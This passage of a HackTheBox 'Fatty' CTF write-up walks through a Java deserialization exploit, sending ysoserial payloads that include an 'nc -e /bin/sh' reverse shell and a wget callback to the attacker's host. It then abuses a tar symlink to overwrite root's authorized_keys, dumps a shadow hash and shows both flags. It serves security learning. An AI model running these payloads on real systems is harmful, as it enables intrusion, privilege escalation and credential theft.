as the password of the user object.</p><p>So here is the final client GUI modification:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        pwChangeButton.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>                String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                    response <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>invoker</span>.<span style=color:#a6e22e>changePW</span>(<span style=color:#e6db74>&#34;cyfun&#34;</span>, <span style=color:#e6db74>&#34;whatever&#34;</span>);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>catch</span> (MessageBuildException <span style=color:#f92672>|</span> MessageParseException e1) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Failure during message building/parsing.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>catch</span> (IOException e2) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                passwordChange.<span style=color:#a6e22e>setVisible</span>(<span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>                controlPanel.<span style=color:#a6e22e>setVisible</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>                textPane.<span style=color:#a6e22e>setText</span>(response);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        });
</span></span></code></pre></div><p>And the final <code>changePW</code> modification:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>changePW</span>(String username, String newPassword) <span style=color:#66d9ef>throws</span> MessageParseException, MessageBuildException, IOException {
</span></span><span style=display:flex><span>        String methodName <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Object(){}.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getEnclosingMethod</span>().<span style=color:#a6e22e>getName</span>();
</span></span><span style=display:flex><span>        logger.<span style=color:#a6e22e>logInfo</span>(<span style=color:#e6db74>&#34;[+] Method &#39;&#34;</span> <span style=color:#f92672>+</span> methodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; was called by user &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>getUsername</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;.&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (AccessCheck.<span style=color:#a6e22e>checkAccess</span>(methodName, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>user</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Error: Method &#39;&#34;</span> <span style=color:#f92672>+</span> methodName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; is not allowed for this user account&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#75715e>//String data = new String(Files.readAllBytes(Paths.get(&#34;revshell.ser&#34;)));</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>//data.getBytes()</span>
</span></span><span style=display:flex><span>        File fd <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;revshell.ser&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> data <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(fd.<span style=color:#a6e22e>toPath</span>());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> serializedUser64 <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getEncoder</span>().<span style=color:#a6e22e>encode</span>(data);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>console</span>().<span style=color:#a6e22e>writer</span>().<span style=color:#a6e22e>println</span>(<span style=color:#66d9ef>new</span> String(serializedUser64));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>action</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ActionMessage(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sessionID</span>, <span style=color:#e6db74>&#34;changePW&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>action</span>.<span style=color:#a6e22e>addArgument</span>(<span style=color:#66d9ef>new</span> String(serializedUser64));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sendAndRecv</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>hasError</span>()) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Error: Your action caused an error on the application server!&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>getContentAsString</span>();
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>In the first time I just generate my payload with a pingback to make sure it works.</p><pre tabindex=0><code>$ ysoserial CommonsCollections5 &#39;wget http://10.10.14.114:8888&#39; &gt; revshell.ser
</code></pre><p>Now let&rsquo;s try to get a reverse shell.</p><pre tabindex=0><code>$ ysoserial CommonsCollections5 &#39;nc 10.10.14.114 8888 -e /bin/sh&#39; &gt; revshell.ser
</code></pre><p>Awesome we get it:</p><pre tabindex=0><code>$ pwncat -l 8888 -vv
INFO: Listening on :::8888 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.174:33803 (family 2/IPv4, TCP)
id
uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)
</code></pre><h2 id=system-reconnaissance>System reconnaissance<a hidden class=anchor aria-hidden=true href=#system-reconnaissance>#</a></h2><p>Looks like the shell we can get are limiteds:</p><pre tabindex=0><code>cat /etc/shells
# valid login shells
/bin/sh
/bin/ash
</code></pre><p>A Debian kernel on an Alpine distro? It highly seems like we are in a docker
container:</p><pre tabindex=0><code>uname -a
Linux 032784d4da1d 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 Linux

cat /etc/os-release
NAME=&#34;Alpine Linux&#34;
ID=alpine
VERSION_ID=3.9.4
PRETTY_NAME=&#34;Alpine Linux v3.9&#34;
HOME_URL=&#34;https://alpinelinux.org/&#34;
BUG_REPORT_URL=&#34;https://bugs.alpinelinux.org/&#34;
</code></pre><p>Where are we?</p><pre tabindex=0><code>pwd
/home/qtc

ls -lhA
total 8
drwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh
----------    1 qtc      qtc           33 Oct 30  2019 user.txt
</code></pre><p>Let&rsquo;s read the user flag:</p><pre tabindex=0><code>chmod u+r user.txt

cat user.txt
7fab2c31fc7173a86872db45ae922073
</code></pre><p>There are some scheduled jobs:</p><pre tabindex=0><code>/etc/crontabs:
total 16
drwxr-xr-x    1 root     root          4096 Jan 29  2020 .
drwxr-xr-x    1 root     root          4096 Jan 29  2020 ..
-rw-------    1 root     root            64 Oct 30  2019 qtc
-rw-------    1 root     root           283 Jan 23  2019 root

/etc/crontabs.back:
total 20
drwxr-xr-x    2 qtc      qtc           4096 Oct 30  2019 .
drwxr-xr-x    1 root     root          4096 Jan 29  2020 ..
-rw-------    1 qtc      qtc              4 Oct 30  2019 cron.update
-rw-------    1 qtc      qtc             64 Oct 30  2019 qtc
-rw-------    1 qtc      qtc            283 Oct 30  2019 root
</code></pre><p>Thanks to the backup directory we can read them:</p><pre tabindex=0><code>cat /etc/crontabs.back/qtc
0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/

cat /etc/crontabs.back/root
# do daily/weekly/monthly maintenance
# min   hour    day     month   weekday command
*/15    *       *       *       *       run-parts /etc/periodic/15min
0       *       *       *       *       run-parts /etc/periodic/hourly
0       2       *       *       *       run-parts /etc/periodic/daily
0       3       *       *       6       run-parts /etc/periodic/weekly
0       5       1       *       *       run-parts /etc/periodic/monthly
</code></pre><p>There is a tar archive created from the logs, and we have permissions over
the 2 folders:</p><pre tabindex=0><code>ls -lh /opt/fatty
total 10592
-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar
drwxr-xr-x    5 root     root        4.0K Oct 30  2019 files
drwxr-xr-x    1 qtc      qtc         4.0K Jan 29  2020 logs
-rwxr-xr-x    1 root     root         406 Oct 30  2019 start.sh
drwxr-xr-x    1 qtc      qtc         4.0K Jul 30 12:00 tar
</code></pre><p>I&rsquo;ll use <a href=https://github.com/DominicBreuker/pspy>pspy</a> to try to catch some flash events.</p><p>Lets download <a href=https://github.com/DominicBreuker/pspy>pspy</a> on our machine:</p><pre tabindex=0><code>$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
</code></pre><p>Then start a web server to serve it:</p><pre tabindex=0><code>$ ruby -run -e httpd . -p 9999
[2020-07-30 22:41:59] INFO  WEBrick 1.6.0
[2020-07-30 22:41:59] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
[2020-07-30 22:41:59] INFO  WEBrick::HTTPServer#start: pid=62423 port=9999
</code></pre><p>Then on the target retrieve it and executes it:</p><pre tabindex=0><code>cd /tmp

wget http://10.10.14.114:9999/pspy64

chmod u+x pspy64

./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ΓûêΓûêΓûôΓûêΓûêΓûê    ΓûêΓûêΓûêΓûêΓûêΓûê  ΓûêΓûêΓûôΓûêΓûêΓûê ΓûôΓûêΓûê   ΓûêΓûêΓûô
    ΓûôΓûêΓûêΓûæ  ΓûêΓûêΓûÆΓûÆΓûêΓûê    ΓûÆ ΓûôΓûêΓûêΓûæ  ΓûêΓûêΓûÆΓûÆΓûêΓûê  ΓûêΓûêΓûÆ
    ΓûôΓûêΓûêΓûæ ΓûêΓûêΓûôΓûÆΓûæ ΓûôΓûêΓûêΓûä   ΓûôΓûêΓûêΓûæ ΓûêΓûêΓûôΓûÆ ΓûÆΓûêΓûê ΓûêΓûêΓûæ
    ΓûÆΓûêΓûêΓûäΓûêΓûôΓûÆ ΓûÆ  ΓûÆ   ΓûêΓûêΓûÆΓûÆΓûêΓûêΓûäΓûêΓûôΓûÆ ΓûÆ Γûæ ΓûÉΓûêΓûêΓûôΓûæ
    ΓûÆΓûêΓûêΓûÆ Γûæ  ΓûæΓûÆΓûêΓûêΓûêΓûêΓûêΓûêΓûÆΓûÆΓûÆΓûêΓûêΓûÆ Γûæ  Γûæ Γûæ ΓûêΓûêΓûÆΓûôΓûæ
    ΓûÆΓûôΓûÆΓûæ Γûæ  ΓûæΓûÆ ΓûÆΓûôΓûÆ ΓûÆ ΓûæΓûÆΓûôΓûÆΓûæ Γûæ  Γûæ  ΓûêΓûêΓûÆΓûÆΓûÆ
    ΓûæΓûÆ Γûæ     Γûæ ΓûæΓûÆ  Γûæ ΓûæΓûæΓûÆ Γûæ     ΓûôΓûêΓûê ΓûæΓûÆΓûæ
    ΓûæΓûæ       Γûæ  Γûæ  Γûæ  ΓûæΓûæ       ΓûÆ ΓûÆ ΓûæΓûæ
                   Γûæ           Γûæ Γûæ
                               Γûæ Γûæ

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/07/30 20:52:20 CMD: UID=0    PID=7      | crond -b
2020/07/30 20:52:20 CMD: UID=1000 PID=2289   | ./pspy64
2020/07/30 20:52:20 CMD: UID=1000 PID=1754   | /bin/sh
2020/07/30 20:52:20 CMD: UID=0    PID=11     | /usr/sbin/sshd
2020/07/30 20:52:20 CMD: UID=1000 PID=10     | java -jar /opt/fatty/fatty-server.jar
2020/07/30 20:52:20 CMD: UID=0    PID=1      | /bin/sh ./start.sh
2020/07/30 20:53:01 CMD: UID=0    PID=2298   | /usr/sbin/sshd -R
2020/07/30 20:53:01 CMD: UID=22   PID=2299   | sshd: [net]
2020/07/30 20:53:01 CMD: UID=0    PID=2300   | sshd: qtc [priv]
2020/07/30 20:53:01 CMD: UID=1000 PID=2301   | ash -c scp -f /opt/fatty/tar/logs.tar
2020/07/30 20:54:02 CMD: UID=0    PID=2302   | /usr/sbin/sshd -R
2020/07/30 20:54:02 CMD: UID=22   PID=2303   | sshd: [net]
2020/07/30 20:54:02 CMD: UID=1000 PID=2304   | sshd: qtc
2020/07/30 20:54:02 CMD: UID=1000 PID=2305   | scp -f /opt/fatty/tar/logs.tar
2020/07/30 20:55:01 CMD: UID=0    PID=2306   | /usr/sbin/sshd -R
2020/07/30 20:55:01 CMD: UID=22   PID=2307   | sshd: [net]
2020/07/30 20:55:01 CMD: UID=0    PID=2308   | sshd: qtc [priv]
2020/07/30 20:55:01 CMD: UID=1000 PID=2309   | ash -c scp -f /opt/fatty/tar/logs.tar
</code></pre><p>After a few seconds we can see a scp that copies the tar archive that was
created by the cron job.</p><p>It seems like a scp command is run from a remote host to retrieve
<code>/opt/fatty/tar/logs.tar</code>, this must come from the docker host.</p><p>Something like that must be run from the docker host:</p><pre tabindex=0><code>scp qtc@172.28.0.4:/opt/fatty/tar/logs.tar /path/on/host/logs.tar
</code></pre><h2 id=privilege-escalation-of-machine>Privilege Escalation of Machine<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine>#</a></h2><p>Ok, fasten your seat belt this is tricky.</p><p>We can guess that if a tarball is copied to the docker host automatically,
then it may be automatically extracted too.</p><p>So I&rsquo;ll try to conduct this 2 steps attack that abuse of symbolic link in
tarball when extracted.</p><ol><li>Create a tarball containing a symlink, the symlink as the same name as the
tarball so when it&rsquo;s extracted it overrides it. The symling points to a file
on the target system that we want to override to get root access.</li><li>Create a file name like the tarball that will override the target file
when copied thanks to the previous symlink abuse.</li></ol><p>One of the less dirty way to pe to root by overriding a file would be to
copy our SSH public key into root SSH authorized keys.</p><pre tabindex=0><code>ln -s /root/.ssh/authorized_keys logs.tar

tar cvf logs.tmp.tar logs.tar
logs.tar

tar tvf logs.tmp.tar
lrwxrwxrwx qtc/qtc         0 2020-07-31 02:13:44 logs.tar -&gt; /root/.ssh/authorized_keys

cp logs.tmp.tar /opt/fatty/tar/logs.tar
</code></pre><p>Then we wait for a few minutes to be sure that scp copy was done, we can
start a 2nd reverse shell and lauch <a href=https://github.com/DominicBreuker/pspy>pspy</a> again to be sure.</p><p>So the scp will copy the tarball to <code>/path/on/host/logs.tar</code> on the host.</p><p>Then it will extract it and use our malicious symlink: <code>/path/on/host/logs.tar</code>
-> <code>/root/.ssh/authorized_keys</code>.</p><p>Then we copy our SSH pubkey to replace the tarball.</p><pre tabindex=0><code>printf %s &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch&#39; &gt; /opt/fatty/tar/logs.tar
</code></pre><p>Then again we wait a few minutes or monitor <a href=https://github.com/DominicBreuker/pspy>pspy</a>.</p><p>It will directly copy our key to <code>/root/.ssh/authorized_keys</code> thanks to our
malicious symlink.</p><p>Then we can connect via ssh:</p><pre tabindex=0><code>$ ssh root@10.10.10.174
The authenticity of host &#39;10.10.10.174 (10.10.10.174)&#39; can&#39;t be established.
ED25519 key fingerprint is SHA256:vrMYTGEAjnC1vfp18WHrsxuDGfueUV0xVfzQErxMKv0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.10.174&#39; (ED25519) to the list of known hosts.
Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 30 15:41:03 2020 from 10.10.15.115
root@fatty:~# pwd
/root
root@fatty:~# cat root.txt
ee982fa19b413415391ed4a17b2bd9c7
root@fatty:~# cat /etc/shadow | grep root
root:$6$5wAdljn7$wUeldtzWZDEtkO9OFyNfXrrxf5jnRw8uJHij.TIsiNM0ne1QzmjclfGdgdAzRWk7AQyEmQM7RfPhJbCEms5sN/:18157:0:99999:7:::
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/insane/>Insane</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/traceback/><span class=title>« Prev</span><br><span>Traceback </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/oouch/><span class=title>Next »</span><br><span>Oouch</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>